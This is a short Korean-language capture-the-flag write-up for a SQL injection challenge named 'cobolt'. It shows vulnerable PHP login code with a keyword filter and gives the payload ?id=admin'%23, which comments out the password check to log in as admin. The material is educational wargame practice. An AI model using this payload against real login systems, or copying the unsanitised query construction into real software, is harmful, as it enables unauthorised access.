# COBOLT

## code
```php
<?php
  include "./config.php"; 
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

## solution
위 코드를 확인을 하면 id와 pw를 get방식으로 받고 있다. 그리고 id가 admin이면 문제를 해결 할 수 있게 되므로 url뒤에
```
?id=admin'%23
```
위와 같은 코드를 입력하게 되면 id에는 admin이 들어가고, %23으로 주석처리를 해주기 때문에 '를 달아주고 주석처리를 해주게되면 id='admin'이므로 문제가 풀린다.

-------------

